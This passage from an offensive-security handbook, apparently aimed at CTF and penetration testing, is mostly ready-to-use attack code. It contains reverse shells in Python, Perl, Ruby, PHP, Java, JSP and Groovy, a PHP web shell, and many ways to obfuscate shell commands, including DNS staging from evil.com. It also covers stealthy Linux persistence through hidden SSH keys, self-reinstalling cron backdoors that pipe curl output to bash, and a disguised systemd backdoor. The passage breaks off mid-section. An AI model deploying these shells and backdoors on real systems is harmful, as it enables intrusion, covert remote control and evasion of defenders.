python -c "import base64; exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjUiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtzdWJwcm9jZXNzLmNhbGwoWyIvYmluL2Jhc2giLCItaSJdKQ=='))"
```

#### Python Upgrade to Full TTY

After establishing basic shell, upgrade to full TTY:

```python
# On target
python -c 'import pty; pty.spawn("/bin/bash")'
# or: python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then press Ctrl+Z to background

# On attacker machine
stty raw -echo; fg

# Press Enter twice

# Set terminal environment
export TERM=xterm-256color
stty rows 38 columns 116
```

### Perl Reverse Shells

Perl is often available on Linux systems and provides reliable reverse shell capabilities.

#### Standard Perl Reverse Shell

```perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

#### Perl Reverse Shell with /bin/sh

```perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Perl One-Liner Without 'use Socket'

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

#### Full Perl Reverse Shell Script

```perl
#!/usr/bin/perl
use strict;
use Socket;
use FileHandle;

my $host = "10.10.14.5";
my $port = 4444;

socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
connect(SOCKET, sockaddr_in($port, inet_aton($host)));

SOCKET->autoflush(1);
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");

system("/bin/bash -i");
```

#### Perl Reverse Shell with Error Handling

```perl
#!/usr/bin/perl
use Socket;

$host = "10.10.14.5";
$port = 4444;

socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp")) or die "Socket: $!";

if(connect(S, sockaddr_in($port, inet_aton($host)))) {
    open(STDIN, ">&S");
    open(STDOUT, ">&S");
    open(STDERR, ">&S");
    exec("/bin/bash -i");
} else {
    die "Connection failed: $!";
}
```

#### Perl CGI Reverse Shell

For web application exploitation:

```perl
#!/usr/bin/perl
use CGI qw(:standard);
use Socket;

print header;

$target = "10.10.14.5";
$port = 4444;

socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));

if(connect(S, sockaddr_in($port, inet_aton($target)))) {
    open(STDIN, ">&S");
    open(STDOUT, ">&S");
    open(STDERR, ">&S");
    exec("/bin/bash -i");
}
```

#### Perl Windows-Compatible Shell

```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.14.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Shell Stabilization Techniques

After establishing any reverse shell, stabilization improves functionality:

#### Method 1: Python PTY Module

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Press Enter twice
```

#### Method 2: Script Command

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset
export SHELL=bash
export TERM=xterm-256color
```

#### Method 3: Expect (if available)

```bash
expect -c 'spawn /bin/bash; interact'
```

#### Method 4: Socat (Most Stable)

```bash
# On attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On target (requires socat binary)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

---

### Ruby Reverse Shells

#### Basic Ruby TCP Reverse Shell

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","PORT");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

**Breakdown of components:**

- `-rsocket` - Require socket library
- `TCPSocket.new` - Create TCP connection
- `loop{c.gets.chomp!}` - Read commands from attacker
- `IO.popen` - Execute commands and capture output

#### Ruby One-liner (Simplified)

```ruby
ruby -rsocket -e 'c=TCPSocket.new("ATTACKER_IP","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

#### Ruby Multi-line Script

```ruby
require 'socket'
require 'open3'

def reverse_shell(ip, port)
  socket = TCPSocket.new(ip, port)
  
  loop do
    socket.print("shell> ")
    command = socket.gets.chomp
    
    break if command == "exit"
    
    begin
      stdout, stderr, status = Open3.capture3(command)
      socket.puts(stdout)
      socket.puts(stderr) unless stderr.empty?
    rescue => e
      socket.puts("Error: #{e.message}")
    end
  end
  
  socket.close
end

reverse_shell("ATTACKER_IP", PORT)
```

**Save as `shell.rb` and execute:**

```bash
ruby shell.rb
```

#### Ruby with PTY (Interactive Shell)

```ruby
ruby -rsocket -e 'spawn("sh",[:in,:out,:err]=>TCPSocket.new("ATTACKER_IP",PORT))'
```

**More reliable PTY version:**

```ruby
require 'socket'
require 'pty'

s = TCPSocket.new("ATTACKER_IP", PORT)
PTY.spawn("/bin/bash") do |output, input, pid|
  Thread.new do
    loop { input.write(s.recv(1024)) }
  end
  loop { s.write(output.readpartial(1024)) }
end
```

#### Ruby Reverse Shell with TLS/SSL

```ruby
require 'socket'
require 'openssl'

tcp_socket = TCPSocket.new('ATTACKER_IP', PORT)
ssl_context = OpenSSL::SSL::SSLContext.new
ssl_context.verify_mode = OpenSSL::SSL::VERIFY_NONE
ssl_socket = OpenSSL::SSL::SSLSocket.new(tcp_socket, ssl_context)
ssl_socket.connect

loop do
  command = ssl_socket.gets.chomp
  break if command == "exit"
  output = `#{command} 2>&1`
  ssl_socket.puts(output)
end

ssl_socket.close
```

**Listener setup:**

```bash
# Generate certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Listen with OpenSSL
openssl s_server -quiet -key key.pem -cert cert.pem -port PORT
```

[Unverified] SSL/TLS reverse shells depend on OpenSSL library availability on target system.

### PHP Reverse Shells

#### Classic PHP Reverse Shell (PentestMonkey)

```php
<?php
set_time_limit(0);
$ip = 'ATTACKER_IP';
$port = PORT;

$sock = fsockopen($ip, $port);
$descriptorspec = array(
   0 => $sock,
   1 => $sock,
   2 => $sock
);

$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
?>
```

#### PHP One-liner Reverse Shell

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'
```

**Alternative one-liner:**

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);shell_exec("/bin/bash -i <&3 >&3 2>&3");'
```

**Using popen:**

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);popen("/bin/bash -i <&3 >&3 2>&3", "r");'
```

#### PHP Reverse Shell with proc_open

```php
<?php
$ip = 'ATTACKER_IP';
$port = PORT;

$sock = fsockopen($ip, $port);
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open('/bin/bash', $descriptorspec, $pipes);

if (is_resource($process)) {
    fwrite($pipes[0], "export TERM=xterm\n");
    fclose($pipes[0]);
    
    while (!feof($pipes[1])) {
        fwrite($sock, fgets($pipes[1]));
    }
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}

fclose($sock);
?>
```

#### PHP Reverse Shell via exec/system

```php
<?php
$ip = 'ATTACKER_IP';
$port = PORT;

$sock = fsockopen($ip, $port);
$desc = array(
    0 => $sock,
    1 => $sock,
    2 => $sock
);

exec('/bin/bash -i <&3 >&3 2>&3');
?>
```

#### PHP Reverse Shell with Stream Sockets

```php
<?php
$ip = 'ATTACKER_IP';
$port = PORT;

$sock = stream_socket_client("tcp://{$ip}:{$port}");
$descriptorspec = array(
   0 => $sock,
   1 => $sock,
   2 => $sock
);

$process = proc_open('/bin/bash', $descriptorspec, $pipes);
proc_close($process);
?>
```

#### PHP Web Shell (Precursor to Reverse Shell)

```php
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

**Usage:**

```
http://target.com/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

#### PHP Upload and Execute Pattern

```php
<?php
file_put_contents('/tmp/shell.sh', base64_decode('IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDA+JjE='));
chmod('/tmp/shell.sh', 0755);
exec('/tmp/shell.sh');
?>
```

### Java Reverse Shells

#### Basic Java Reverse Shell

```java
import java.io.*;
import java.net.*;

public class ReverseShell {
    public static void main(String[] args) throws Exception {
        String host = "ATTACKER_IP";
        int port = PORT;
        
        Socket socket = new Socket(host, port);
        Process process = new ProcessBuilder("/bin/bash")
            .redirectErrorStream(true)
            .start();
        
        InputStream processOutput = process.getInputStream();
        OutputStream processInput = process.getOutputStream();
        InputStream socketInput = socket.getInputStream();
        OutputStream socketOutput = socket.getOutputStream();
        
        Thread outputThread = new Thread(() -> {
            try {
                byte[] buffer = new byte[1024];
                int length;
                while ((length = processOutput.read(buffer)) != -1) {
                    socketOutput.write(buffer, 0, length);
                    socketOutput.flush();
                }
            } catch (IOException e) {}
        });
        
        Thread inputThread = new Thread(() -> {
            try {
                byte[] buffer = new byte[1024];
                int length;
                while ((length = socketInput.read(buffer)) != -1) {
                    processInput.write(buffer, 0, length);
                    processInput.flush();
                }
            } catch (IOException e) {}
        });
        
        outputThread.start();
        inputThread.start();
        outputThread.join();
        inputThread.join();
        
        process.destroy();
        socket.close();
    }
}
```

**Compile and execute:**

```bash
javac ReverseShell.java
java ReverseShell
```

#### Java One-liner (Runtime.exec)

```java
java -c 'Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done"});'
```

[Inference] This one-liner may not work on all Java versions or configurations; full Java programs are more reliable.

#### Java Reverse Shell using ProcessBuilder

```java
import java.io.*;
import java.net.*;

public class Shell {
    public static void main(String[] args) {
        try {
            Socket socket = new Socket("ATTACKER_IP", PORT);
            
            ProcessBuilder pb = new ProcessBuilder("/bin/bash");
            pb.redirectInput(ProcessBuilder.Redirect.from(new File(socket.getInputStream())));
            pb.redirectOutput(ProcessBuilder.Redirect.to(socket.getOutputStream()));
            pb.redirectError(ProcessBuilder.Redirect.to(socket.getOutputStream()));
            
            Process process = pb.start();
            process.waitFor();
            
            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

#### Java JSP Reverse Shell (Web Application)

```jsp
<%@ page import="java.io.*,java.net.*" %>
<%
    String host = "ATTACKER_IP";
    int port = PORT;
    
    Socket socket = new Socket(host, port);
    Process process = Runtime.getRuntime().exec("/bin/bash");
    
    InputStream processIn = process.getInputStream();
    InputStream processErr = process.getErrorStream();
    InputStream socketIn = socket.getInputStream();
    OutputStream processOut = process.getOutputStream();
    OutputStream socketOut = socket.getOutputStream();
    
    class StreamConnector extends Thread {
        InputStream in;
        OutputStream out;
        
        StreamConnector(InputStream in, OutputStream out) {
            this.in = in;
            this.out = out;
        }
        
        public void run() {
            try {
                byte[] buffer = new byte[4096];
                int length;
                while ((length = in.read(buffer)) > 0) {
                    out.write(buffer, 0, length);
                    out.flush();
                }
            } catch (Exception e) {}
        }
    }
    
    new StreamConnector(processIn, socketOut).start();
    new StreamConnector(processErr, socketOut).start();
    new StreamConnector(socketIn, processOut).start();
%>
```

#### Java Groovy Reverse Shell

```groovy
String host = "ATTACKER_IP"
int port = PORT

Socket socket = new Socket(host, port)
Process process = "bash".execute()

process.consumeProcessOutput(socket.outputStream, socket.outputStream)
socket.inputStream.eachByte(1) { byte b -> process.outputStream.write(b) }
```

**Execute:**

```bash
groovy shell.groovy
```

### Shell Encoding and Obfuscation

#### Base64 Encoding

**Encode bash reverse shell:**

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDA+JjE=

# Execute encoded command
echo YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDA+JjE= | base64 -d | bash

# Alternative execution
bash -c "$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDA+JjE= | base64 -d)"
```

**PHP base64 obfuscation:**

```php
<?php eval(base64_decode('c3lzdGVtKCdiYXNoIC1pID4mIC9kZXYvdGNwL0FUVEFDS0VSX0lQL1BPUlQgMD4mMScpOw==')); ?>
```

#### Hex Encoding

```bash
# Encode command to hex
echo -n 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' | xxd -p
# Output: 62617368202d69203e26202f6465762f7463702f4154...

# Execute hex-encoded command
echo 62617368202d69203e26202f6465762f7463702f4154... | xxd -r -p | bash

# Alternative with printf
printf '\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20...' | bash
```

#### URL Encoding

```bash
# Encode for URL parameters
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2FPORT%200%3E%261%27

# In PHP context
<?php system(urldecode('bash%20-c%20%27bash%20-i%20%3E%26%20...')); ?>
```

#### Unicode/UTF Obfuscation

```bash
# Using Unicode escape sequences in Python
python -c "exec('\u0062\u0061\u0073\u0068\u0020\u002d\u0069\u0020...')"
```

#### Variable Substitution Obfuscation

```bash
# Break up command with variables
a='ba';b='sh';c=' -i';d=' >&';e=' /dev/tcp/ATTACKER_IP/PORT 0>&1'
$a$b$c$d$e

# Using parameter expansion
${PATH:0:1}bin${PATH:0:1}bash -i >& ${PATH:0:1}dev${PATH:0:1}tcp${PATH:0:1}ATTACKER_IP${PATH:0:1}PORT 0>&1

# Character concatenation
command="b""a""s""h"" ""-""i"
$command >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

#### Command Substitution Obfuscation

```bash
# Using backticks
`echo bash` -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Using $()
$(echo bash) -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Reading from file
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > /tmp/.cmd
$(cat /tmp/.cmd)
```

#### String Reversal

```bash
# Reverse string (bash)
rev<<<'1>&0 TROP/PI_REKCATTA/pct/ved/ &> i- hsab' | bash

# Using Python
python -c "exec('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'[::-1][::-1])"
```

#### Compression Obfuscation

```bash
# Gzip compress and base64 encode
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' | gzip | base64
# Output: H4sIAAAAAAAAA...

# Decompress and execute
echo H4sIAAAAAAAAA... | base64 -d | gunzip | bash

# Bzip2 alternative
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' | bzip2 | base64
echo [BASE64_OUTPUT] | base64 -d | bunzip2 | bash
```

#### XOR Encoding

```python
# Python XOR encoder
import base64

def xor_encrypt(data, key):
    return ''.join(chr(ord(c) ^ key) for c in data)

command = "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
key = 0x42
encrypted = xor_encrypt(command, key)
encoded = base64.b64encode(encrypted.encode()).decode()

print(f"Encoded: {encoded}")
print(f"Decoder: python -c \"import base64;exec(''.join(chr(ord(c)^0x42) for c in base64.b64decode('{encoded}').decode()))\"")
```

#### Environment Variable Obfuscation

```bash
# Store in environment variable
export CMD='bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
eval $CMD

# Hidden in PATH-like variable
export PATH_TEMP='bash:-i:>&:/dev/tcp/ATTACKER_IP/PORT:0>&1'
eval $(echo $PATH_TEMP | tr ':' ' ')
```

#### Character Escape Obfuscation

```bash
# Using backslash escapes
b\a\s\h -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Using quotes
b'a's'h' -'i' >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Mixed quotes and escapes
"b"a's'h -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

#### Integer-based Obfuscation

```bash
# Using printf with octal
$(printf "\142\141\163\150") -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Using printf with hex
$(printf "\x62\x61\x73\x68") -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

#### PowerShell-style Obfuscation (Bash Equivalent)

```bash
# Character code array
bash -c "$(echo -e '\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x41\x54\x54\x41\x43\x4b\x45\x52\x5f\x49\x50\x2f\x50\x4f\x52\x54\x20\x30\x3e\x26\x31')"
```

#### DNS Exfiltration Staging

```bash
# Stage 1: Command stored in DNS TXT record
# Query DNS and execute
bash -c "$(dig +short TXT evil.com | tr -d '\"')"

# Stage 2: Multiple DNS queries for large payloads
for i in {1..5}; do 
    dig +short TXT chunk$i.evil.com | tr -d '\"' >> /tmp/.payload
done
bash /tmp/.payload
```

[Unverified] DNS-based staging requires control of DNS server and may be logged by DNS resolvers.

#### Multi-layer Encoding

```bash
# Base64 -> Hex -> Base64
# Original: bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
# Step 1: Base64
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' | base64
# Step 2: Convert base64 to hex
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDA+JjE=' | xxd -p
# Step 3: Base64 encode the hex
echo '596d467a6143...' | base64

# Decode and execute
echo [FINAL_BASE64] | base64 -d | xxd -r -p | base64 -d | bash
```

### Listener Setup

**Basic netcat listener:**

```bash
nc -lvnp PORT
```

**With output logging:**

```bash
nc -lvnp PORT | tee session.log
```

**rlwrap for better shell interaction:**

```bash
rlwrap nc -lvnp PORT
```

**Socat listener (more stable):**

```bash
socat TCP-LISTEN:PORT,reuseaddr,fork -
```

### Important Security Note

These techniques are intended exclusively for authorized security testing, CTF competitions, and educational purposes within controlled environments. Unauthorized use of reverse shells against systems you don't own or have explicit permission to test is illegal and unethical.

### Related Topics

For complete shell access coverage, also investigate:

- **Bind shells** (target listens, attacker connects)
- **Shell upgrading** (Python PTY, script, socat for full TTY)
- **Firewall evasion** (alternative ports, protocols, DNS tunneling)
- **Encrypted shells** (SSL/TLS wrapped connections, SSH tunneling)
- **Persistence mechanisms** (cron jobs, systemd services, bashrc modification)


---

## Maintaining Access (Linux)

### SSH Key Persistence

SSH key-based authentication provides stealthy, password-less access to compromised systems. This technique is quieter than traditional backdoors and blends with legitimate administrative access.

#### Understanding SSH Key Authentication

**Key components:**

- **Private key** - Kept secret on attacker machine
- **Public key** - Placed in target's `~/.ssh/authorized_keys`
- **Key formats** - RSA, ECDSA, ED25519

**Authentication flow:**

1. Client presents public key identity
2. Server verifies key exists in authorized_keys
3. Server challenges client with encrypted data
4. Client decrypts with private key
5. Authentication succeeds without password

#### Generating SSH Key Pairs

**Generate RSA key pair (most compatible):**

```bash
ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistence_key -N ""
```

**Generate ED25519 key pair (smaller, modern):**

```bash
ssh-keygen -t ed25519 -f ~/.ssh/persistence_key -N ""
```

**Generate key with comment for blending:**

```bash
ssh-keygen -t rsa -b 4096 -C "admin@company.com" -f ~/.ssh/persistence_key -N ""
```

**Key generation parameters:**

- `-t` - Key type (rsa, ecdsa, ed25519)
- `-b` - Bit length (2048, 4096 for RSA)
- `-f` - Output filename
- `-N ""` - Empty passphrase (no password protection)
- `-C` - Comment field (appears in authorized_keys)

#### Installing SSH Keys on Target

**Basic key installation:**

```bash
# View your public key
cat ~/.ssh/persistence_key.pub

# On target system
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

**One-liner from attacker machine:**

```bash
# Generate and install in single command
ssh-keygen -t ed25519 -f /tmp/key -N "" && cat /tmp/key.pub | ssh user@target "mkdir -p ~/.ssh; cat >> ~/.ssh/authorized_keys"
```

**Install for root user:**

```bash
# After gaining root access
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

**Install for multiple users:**

```bash
# Iterate through users with home directories
for user in $(ls /home); do
    mkdir -p /home/$user/.ssh
    echo "YOUR_PUBLIC_KEY" >> /home/$user/.ssh/authorized_keys
    chmod 600 /home/$user/.ssh/authorized_keys
    chmod 700 /home/$user/.ssh
    chown -R $user:$user /home/$user/.ssh
done
```

#### Stealthy SSH Key Persistence Techniques

**Hide key among existing keys:**

```bash
# Add your key in middle of existing authorized_keys
sed -i '5i YOUR_PUBLIC_KEY' ~/.ssh/authorized_keys
```

**Use legitimate-looking comment:**

```bash
# Key with corporate naming convention
ssh-rsa AAAAB3Nza... admin@prod-server-01
ssh-rsa AAAAB3Nza... jenkins-automation@company.com
ssh-rsa AAAAB3Nza... backup-system@internal
```

**Modify file timestamps to match:**

```bash
# Copy timestamps from another file
touch -r /etc/passwd ~/.ssh/authorized_keys
```

**Set immutable flag (prevents deletion):**

```bash
# Requires root privileges
chattr +i ~/.ssh/authorized_keys
# To remove: chattr -i ~/.ssh/authorized_keys
```

**Alternative authorized_keys location:**

```bash
# SSH can read from alternate location if configured
# Add to /etc/ssh/sshd_config:
AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2

# Then place key in authorized_keys2
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys2
chmod 600 ~/.ssh/authorized_keys2
```

**Hidden SSH directory:**

```bash
# Create hidden alternate SSH directory
mkdir -p ~/.config/.ssh
echo "YOUR_PUBLIC_KEY" > ~/.config/.ssh/authorized_keys
chmod 600 ~/.config/.ssh/authorized_keys

# Configure SSH to check this location (requires sshd_config access)
echo "AuthorizedKeysFile /home/%u/.config/.ssh/authorized_keys" >> /etc/ssh/sshd_config
systemctl restart sshd
```

#### Connecting with Persistence Keys

**Basic connection:**

```bash
ssh -i ~/.ssh/persistence_key user@target_ip
```

**Connection with specific port:**

```bash
ssh -i ~/.ssh/persistence_key -p 2222 user@target_ip
```

**SSH config for easy access:**

```bash
# Add to ~/.ssh/config on attacker machine
Host target
    HostName 192.168.1.100
    User root
    IdentityFile ~/.ssh/persistence_key
    StrictHostKeyChecking no

# Connect simply with:
ssh target
```

**Port forwarding for pivoting:**

```bash
# Dynamic SOCKS proxy
ssh -i ~/.ssh/persistence_key -D 9050 user@target_ip

# Local port forwarding
ssh -i ~/.ssh/persistence_key -L 8080:internal_host:80 user@target_ip
```

#### SSH Service Configuration for Persistence

**Modify sshd_config for persistence:**

```bash
# Enable password authentication as backup
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Allow root login
sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

# Change SSH port to non-standard (avoid scans)
sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config

# Restart SSH service
systemctl restart sshd
```

**[Inference]** Modifying SSH configuration may trigger monitoring alerts. Key-based access without configuration changes is stealthier.

### Cron Job Backdoors

Cron jobs execute commands on schedule, providing automated persistence without manual intervention. System-level cron jobs run as root, making them powerful persistence mechanisms.

#### Understanding Cron Syntax

**Cron time format:**

```
* * * * * command
│ │ │ │ │
│ │ │ │ └─── Day of week (0-7, 0 and 7 are Sunday)
│ │ │ └───── Month (1-12)
│ │ └─────── Day of month (1-31)
│ └───────── Hour (0-23)
└─────────── Minute (0-59)
```

**Common cron schedules:**

```bash
* * * * *          # Every minute
*/5 * * * *        # Every 5 minutes
0 * * * *          # Every hour
0 0 * * *          # Daily at midnight
0 0 * * 0          # Weekly on Sunday
@reboot            # At system startup
@hourly            # Once per hour
@daily             # Once per day
```

#### User-Level Cron Backdoors

**Add cron job for current user:**

```bash
# Edit crontab
crontab -e

# Add reverse shell that connects every 5 minutes
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

**Install cron job without interactive editor:**

```bash
# Add to existing crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -
```

**Remove specific cron entry:**

```bash
crontab -l | grep -v "ATTACKER_IP" | crontab -
```

**View current user's crontab:**

```bash
crontab -l
```

**Specify user's crontab (requires root):**

```bash
crontab -u username -e
crontab -u username -l
```

#### System-Level Cron Backdoors

**Add to system-wide cron directories:**

**/etc/cron.d/ (preferred method):**

```bash
# Create new cron file
echo "*/10 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" > /etc/cron.d/system-update
chmod 644 /etc/cron.d/system-update
```

**/etc/crontab (system-wide cron table):**

```bash
echo "*/10 * * * * root /tmp/.hidden/backdoor.sh" >> /etc/crontab
```

**Scheduled cron directories:**

```bash
# Place executable scripts in these directories

# /etc/cron.hourly/ - Runs every hour
cat > /etc/cron.hourly/system-check << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /etc/cron.hourly/system-check

# /etc/cron.daily/ - Runs daily
cat > /etc/cron.daily/backup << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /etc/cron.daily/backup

# /etc/cron.weekly/ - Runs weekly
# /etc/cron.monthly/ - Runs monthly
```

#### Stealthy Cron Backdoors

**Execute from hidden location:**

```bash
# Create hidden directory
mkdir -p /var/tmp/.system
cat > /var/tmp/.system/update.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /var/tmp/.system/update.sh

# Add to crontab
echo "*/15 * * * * /var/tmp/.system/update.sh" | crontab -
```

**Use legitimate-looking script names:**

```bash
# Examples of names that blend in
/usr/local/bin/system-health-check
/opt/monitoring/node-exporter
/var/lib/update-notifier/updates-available
```

**Redirect output to /dev/null (hide execution):**

```bash
*/10 * * * * /path/to/backdoor.sh > /dev/null 2>&1
```

**Conditional execution (only when connection possible):**

```bash
*/5 * * * * ping -c 1 ATTACKER_IP > /dev/null 2>&1 && bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Time-based execution (specific hours):**

```bash
# Only during business hours (9 AM - 5 PM weekdays)
0 9-17 * * 1-5 /path/to/backdoor.sh

# Only during off-hours (avoid detection)
0 22-23,0-6 * * * /path/to/backdoor.sh
```

**Obfuscated commands:**

```bash
# Base64 encoded reverse shell
*/10 * * * * echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=" | base64 -d | bash

# Download and execute
*/15 * * * * curl -s http://ATTACKER_IP/shell.sh | bash
```

#### Advanced Cron Persistence

**Cron job that re-installs itself:**

```bash
cat > /tmp/persistent.sh << 'EOF'
#!/bin/bash
# Re-add to crontab if removed
(crontab -l 2>/dev/null | grep -q "persistent.sh") || (crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/persistent.sh") | crontab -

# Backdoor payload
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /tmp/persistent.sh
(crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/persistent.sh") | crontab -
```

**Cron job with watchdog (recreates deleted files):**

```bash
# Cron entry
*/5 * * * * [ -f /usr/local/bin/backdoor ] || curl -o /usr/local/bin/backdoor http://ATTACKER_IP/backdoor && chmod +x /usr/local/bin/backdoor; /usr/local/bin/backdoor
```

**Multiple redundant cron jobs:**

```bash
# Install same backdoor in multiple locations
*/7 * * * * /var/tmp/.update
*/11 * * * * /tmp/.system-health
*/13 * * * * /dev/shm/.monitor
```

### Systemd Service Persistence

Systemd services provide robust persistence that survives reboots and integrates with system initialization. Services appear as legitimate system components.

#### Understanding Systemd Services

**Service locations:**

- `/etc/systemd/system/` - System administrator services (highest priority)
- `/usr/lib/systemd/system/` - Package-installed services
- `/run/systemd/system/` - Runtime services

**Service file structure:**

```ini
[Unit]
Description=Service description
After=network.target

[Service]
Type=simple
ExecStart=/path/to/command
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

#### Creating Basic Systemd Backdoor

**Create service file:**

```bash
cat > /etc/systemd/system/system-monitor.service << 'EOF'
[Unit]
Description=System Resource Monitor
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1; sleep 60; done'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
```

**Enable and start service:**

```bash
systemctl daemon-reload
systemctl enable system-monitor.service
systemctl start system-monitor.service
```

**Verify service status:**

```bash
systemctl status system-monitor.service
systemctl is-enabled system-monitor.service
```

#### Script-Based Systemd Backdoor

**Create backdoor script:**

```bash
mkdir -p /usr/local/lib/system-monitor
